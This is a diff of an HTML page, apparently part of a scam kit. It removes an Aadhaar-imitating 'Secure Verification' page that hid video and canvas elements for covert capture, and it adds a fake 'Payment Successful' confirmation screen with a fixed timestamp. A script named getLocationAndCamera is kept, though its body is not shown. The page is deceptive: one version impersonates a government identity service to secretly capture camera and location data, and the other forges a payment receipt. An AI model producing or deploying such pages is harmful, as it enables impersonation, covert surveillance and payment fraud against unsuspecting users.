@@ -3,91 +3,56 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Secure Verification</title>
+  <title>Payment Successful</title>
   <style>
     body {
       margin: 0;
       padding: 0;
       font-family: 'Segoe UI', sans-serif;
-      background-color: #f4f4f4;
+      background-color: #34A853; /* Green background */
+      color: white;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
       text-align: center;
     }
 
-    .header {
-      padding: 20px;
-      background-color: #fff;
-      border-bottom: 1px solid #ccc;
+    .checkmark {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      background-color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 20px;
     }
 
-    .logo {
-      margin-top: 10px;
+    .checkmark::before {
+      content: "✓";
+      font-size: 48px;
+      color: #34A853;
+      font-weight: bold;
     }
 
-    .title {
-      font-size: 20px;
-      color: #0077b6;
-      margin-top: 20px;
+    .text {
+      font-size: 24px;
       font-weight: 600;
     }
 
-    .subtitle {
-      color: #1a5d9c;
+    .timestamp {
+      margin-top: 10px;
       font-size: 16px;
-      margin-bottom: 30px;
-    }
-
-    .language-buttons {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 16px;
-      max-width: 800px;
-      margin: 0 auto;
-    }
-
-    .btn {
-      background-color: #bbb;
-      border: none;
-      padding: 12px 24px;
-      font-size: 18px;
-      cursor: default;
-      border-radius: 5px;
-      color: #0077b6;
-      min-width: 120px;
-    }
-
-    .hidden {
-      display: none;
+      color: #e0f2e9;
     }
   </style>
 </head>
 <body>
-  <div class="header">
-    <img src="static\Aadhaar_Logo.svg.png" alt="Aadhaar" height="80" class="logo">
-  </div>
-
-  <div class="title">Select your Preferred Language to Enter the Website</div>
-  <div class="subtitle">वेबसाइट में प्रवेश करने के लिए अपनी पसंदीदा भाषा का चयन करें</div>
-
-  <div class="language-buttons">
-    <button class="btn">English</button>
-    <button class="btn">हिंदी</button>
-    <button class="btn">অসমীয়া</button>
-    <button class="btn">বাংলা</button>
-    <button class="btn">ಕನ್ನಡ</button>
-    <button class="btn">ગુજરાતી</button>
-    <button class="btn">മലയാളം</button>
-    <button class="btn">मराठी</button>
-    <button class="btn">ଓଡ଼ିଆ</button>
-    <button class="btn">ਪੰਜਾਬੀ</button>
-    <button class="btn">தமிழ்</button>
-    <button class="btn">తెలుగు</button>
-    <button class="btn">اردو</button>
-  </div>
-
-  <!-- Invisible capture elements -->
-  <video id="video" autoplay playsinline class="hidden"></video>
-  <canvas id="canvas" width="320" height="240" class="hidden"></canvas>
+  <div class="checkmark"></div>
+  <div class="text">Payment Successful</div>
+  <div class="timestamp">20 June 2025 at 12:56 PM</div>
 
   <script>
   async function getLocationAndCamera() {
